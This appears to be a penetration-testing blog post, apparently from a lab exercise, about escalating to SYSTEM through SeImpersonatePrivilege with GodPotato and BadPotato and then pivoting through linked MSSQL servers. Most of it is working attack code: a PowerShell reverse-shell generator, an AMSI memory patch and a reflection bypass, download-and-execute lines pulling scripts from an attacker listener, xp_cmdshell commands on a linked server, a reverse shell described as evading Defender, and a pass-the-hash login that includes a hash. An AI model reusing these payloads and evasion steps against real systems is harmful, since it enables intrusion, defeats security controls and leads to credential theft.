---
title: Enumerate MSSQL
date: 2024-11-27 19:37:00 +/-TTTT
categories: [beacon, bypass-AV/EDR]
tags: [SeImpersonatePrivilege, MSSQL]     # TAG names should always be lowercase
---

![img-description](/assets/images/IMG_0042.png)

# Unveiling the Power of SeImpersonatePrivilege and Enumerating MSSQL

In the world of cybersecurity, privilege escalation and enumeration often play pivotal roles in uncovering vulnerabilities within systems. Among the many privileges granted to processes, **SeImpersonatePrivilege** stands out as a key enabler for lateral movement and privilege escalation on Windows systems. Its significance lies in its ability to allow processes to impersonate the security context of another user, potentially escalating rights and accessing restricted resources.

When combined with the enumeration of Microsoft SQL Server (MSSQL), this privilege becomes a powerful tool for ethical hackers and penetration testers. MSSQL servers, often misconfigured or overlooked, can serve as a goldmine of sensitive information or provide a gateway for further exploitation. By understanding how to leverage **SeImpersonatePrivilege** and enumerate MSSQL environments effectively, professionals can enhance their skill set and contribute to securing organisational infrastructure.

In this blog post, we’ll delve into the mechanics of **SeImpersonatePrivilege**, explore its practical applications in enumeration, and demonstrate real-world examples of how it can be used in tandem with MSSQL to achieve penetration testing objectives. Whether you're a beginner or an experienced practitioner, this guide aims to equip you with actionable insights for your cybersecurity journey.

## SeImpersonatePrivilege

After ur 'whoami /all' command;

![img-description](/assets/images/WhatsApp Image 2024-11-27 at 19.44.57.jpeg)

We already create before exe file which is great and can bypass AV/EDR so rn we can run with Godpotato.exe while not put on disk and get shell as system. I will show my 2 way which is great btw.

### First Path

[godpotato.](https://github.com/BeichenDream/GodPotato) u already know how to compile it we did before while create a beacon.

    [11/27 11:54:09] beacon> execute-assembly /home/elliot/Documents/cybernetics/godpotato.exe -cmd C:\Windows\Tasks\OneDriveUptader.exe

![img-description](/assets/images/WhatsApp Image 2024-11-27 at 19.57.12.jpeg)

In this example, I executed GodPotato.exe without writing it to disk, maintaining a fileless execution approach to avoid detection by endpoint protection solutions. Using the execute-assembly command, I directly loaded the .NET assembly of GodPotato.exe into memory from my Beacon, bypassing the need to store the executable on the target system.

This technique leverages in-memory execution to minimise the footprint on the target, making it significantly harder for traditional antivirus or endpoint detection systems to detect and block the operation. The command also includes a -cmd argument to specify the payload to be executed—in this case, a task named OneDriveUpdater.exe located at C:\Windows\Tasks. This method exemplifies the power of fileless attacks in modern penetration testing scenarios, ensuring both stealth and efficiency.

### Second Path
payload.py

    #!/usr/bin/env python
    import base64
    import sys

    if len(sys.argv) < 3:
    print('usage : %s ip port' % sys.argv[0])
    sys.exit(0)

    payload="""
    $c = New-Object System.Net.Sockets.TCPClient('%s',%s);
    $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
        $sb = (iex $d 2>&1 | Out-String );
        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
        $s.Write($sb,0,$sb.Length);
        $s.Flush()
    };
    $c.Close()
    """ % (sys.argv[1], sys.argv[2])

    byte = payload.encode('utf-16-le')
    b64 = base64.b64encode(byte)
    print("powershell -exec bypass -enc %s" % b64.decode())

here is it our payload.py and we can create out runme.bat lets try with this to get shell.

amsi_rmouse.txt

    # Patching amsi.dll AmsiScanBuffer by rasta-mouse
    $Win32 = @"

    using System;
    using System.Runtime.InteropServices;

    public class Win32 {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    }
    "@

    Add-Type $Win32

    $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
    $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
    $p = 0
    [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
    $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

and another script which is ps but we will run as txt amsi_rmouse.txt




    cd www
    echo "@echo off" > runme.bat
    echo "start /b $(python3 payload.py 10.10.14.6 445)" >> runme.bat
    echo "exit /b" >> runme.bat
    python3 -m http.server 80

for run them AMSI bypass. there is another way to do it cauze we dont wanna exe files on disk SO that means why we used [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)

    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
    iex(new-object system.net.webclient).downloadstring('http://10.10.14.6/amsi_rmouse.txt')
    iex(new-object net.webclient).downloadstring('http://10.10.14.6/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')
    Invoke-BadPotato -Command "c:\temp\runme.bat"

it will hit me back as administrator.

## Leveraging SeImpersonatePrivilege for MSSQL Enumeration in Pentests

How to use [sqlcmd](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-use-utility?view=sql-server-ver16)?

Lets try to get linked server first cauze we already administrator and try to enum other hosts link. After all we can dump all MSSQL parts.

### First Way (dont recommend)

![img-description](/assets/images/WhatsApp Image 2024-11-27 at 20.30.52.jpeg)

    sqlcmd -E -S "CYWEBDW" -Q "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [m3sqlw.m3c.local]"

    sqlcmd -E -S "CYWEBDW" -Q "EXEC ('exec master..xp_cmdshell ''powershell -NoP -NonI -c Invoke-WebRequest -Uri http://10.10.14.6/a.ps1 -OutFile c:\users\public\documents\irem.ps1''') AT [m3sqlw.m3c.local]"

    sqlcmd -E -S "CYWEBDW" -Q "EXEC ('exec master..xp_cmdshell ''powershell -NoP -NonI -File c:\users\public\documents\irem.ps1''') AT [m3sqlw.m3c.local]"

    sqlcmd -E -S "CYWEBDW" -Q "EXEC ('exec master..xp_cmdshell ''powershell -NoP -NonI -File c:\users\public\documents\irem.ps1''') AT [m3sqlw.m3c.local]"

U can also use our beacon but i just wanna show u another method. This irem.ps1 im gonna share its obfs ps1 can bypass defender.

    $myClient = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
    $myStream = $myClient.GetStream();
    [byte[]]$myBuffer = 0..65535 | % { 0 };

    while(($myRead = $myStream.Read($myBuffer, 0, $myBuffer.Length)) -ne 0) {
        $myData = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($myBuffer, 0, $myRead);
        $mySendBack = (iex $myData 2>&1 | Out-String);
        $mySendBack2 = $mySendBack + 'custom_prompt> ';
        $mySendByte = ([text.encoding]::ASCII).GetBytes($mySendBack2);
        $myStream.Write($mySendByte, 0, $mySendByte.Length);
        $myStream.Flush();
    }

    $myClient.Close();

![img-description](/assets/images/WhatsApp Image 2024-11-27 at 20.42.26.jpeg)

AND get shell as mssql server.

### Second Way (totally recommend)

U know we already SYSTEM so why cannot dump hashes and pivoting for mssql???

![img-description](/assets/images/WhatsApp Image 2024-11-27 at 20.49.50.jpeg)

now i can connect with the admin hash to the mssql service


    ➜  cybernetics proxychains impacket-mssqlclient Administrator@CYWEBDW -hashes :4e63f2ecad6ac1c809564e26ea764999 -windows-auth
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.13.0.dev0+20241025.203625.64673aa9 - Copyright Fortra, LLC and its affiliated companies 

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  CYWEBDW:1433  ...  OK
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(CYWEBDW\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(CYWEBDW\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (130 15161) 
    [!] Press help for extra shell commands
    SQL (CYWEBDW\Administrator  dbo@master)>

Lets jump Link and enable_xp_cmdshell

    SQL (CYWEBDW\Administrator  dbo@master)> use_link [m3sqlw.m3c.local]
    SQL >[m3sqlw.m3c.local] (sa  dbo@master)> enable_xp_cmdshell

There is also ImperSonatePrivilege so lets grab as shell admin now.


    [11/27 11:54:09] beacon> execute-assembly /home/elliot/Documents/cybernetics/godpotato.exe -cmd C:\Windows\Tasks\OneDriveUptader.exe

coming soon other methods...